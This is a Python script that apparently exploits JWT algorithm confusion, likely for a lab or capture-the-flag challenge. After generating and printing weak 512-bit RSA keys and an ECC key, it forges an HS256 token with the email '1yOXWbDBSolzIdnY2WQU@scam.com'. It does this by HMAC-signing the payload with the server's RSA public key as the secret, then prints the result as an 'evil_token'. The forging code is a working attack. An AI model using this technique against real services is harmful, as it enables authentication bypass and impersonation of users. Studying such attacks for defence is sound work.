from authlib.jose import jwt
from Crypto.PublicKey import RSA
from Crypto.Hash import HMAC, SHA256
import base64
import datetime
import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import ec
import rsa
from cryptography.hazmat.primitives.asymmetric import rsa as crsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
import random
import sympy
import time 
import pickle
import base64

import base64

# Generate ECC key pair
private_key = ec.generate_private_key(ec.SECP256R1())
public_key = private_key.public_key()
print("private_key",private_key)
print("public_key",public_key)

# ----- SETUP -----

# generate an asymmetric RSA keypair
# !! signing should only be possible with the private key !!
# time = datetime.datetime.now()
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=512
)
public_key = private_key.public_key()
public_key_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)
private_key_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)
print("public_key_pem",public_key_pem)
print("private_key_pem",private_key_pem)


KEY = RSA.generate(512)
PUBKEY = KEY.publickey().export_key(format='PEM')
PRIVKEY = KEY.export_key(format='PEM')
print("KEY",PUBKEY)
print("PRIVKEY",PRIVKEY)


def format_rsa_public_key(key_str):
    #byte_len = 32 #64
    byte_len = 64
    key_str = key_str.replace(" ", "").replace("\n", "")
    formatted_key = "-----BEGIN RSA PUBLIC KEY-----\n"
    
    # Split the key into 64-character lines
    for i in range(0, len(key_str), byte_len):
        formatted_key += key_str[i:i+byte_len] + "\n"
    
    formatted_key += "-----END RSA PUBLIC KEY-----\n"
    return formatted_key

def encrypt_rsa(message, key):
    return rsa.encrypt(message, key)


#public_key = "-----BEGIN PUBLIC KEY-----\nMFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAO0PAC8qfkJFt+Uxm+yOH7x+3jvBZCg6\nQMzN83dV7c4E1UFsGj5QY4+goahPpxqq8nCb6+FfHfoYhb6iR1G6ngcCAwEAAQ==\n-----END PUBLIC KEY-----\n"
PUBKEY = public_key.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)
print("Das hier ist der Publickey",PUBKEY)


# b64 = lambda x:base64.urlsafe_b64encode(x).replace(b'=',b'')
# payload = b64(b'{"alg":"HS256"}') + b'.' + b64(b'{"email":"1yOXWbDBSolzIdnY2WQU@scam.com"}')
# hasher = HMAC.new(PUBKEY, digestmod=SHA256)
# hasher.update(payload)
# evil_token = payload + b'.' + b64(hasher.digest())
# print("ðŸ˜ˆ",evil_token)


email = "1yOXWbDBSolzIdnY2WQU@scam.com"
b64 = lambda x:base64.urlsafe_b64encode(x).replace(b'=',b'')
payload = b64(b'{"alg":"HS256"}') + b'.' + b64(f'{{"email":"{email}"}}'.encode('utf-8'))
hasher = HMAC.new(PUBKEY, digestmod=SHA256)
hasher.update(payload)
evil_token = payload + b'.' + b64(hasher.digest())
print("ðŸ˜ˆ",evil_token)

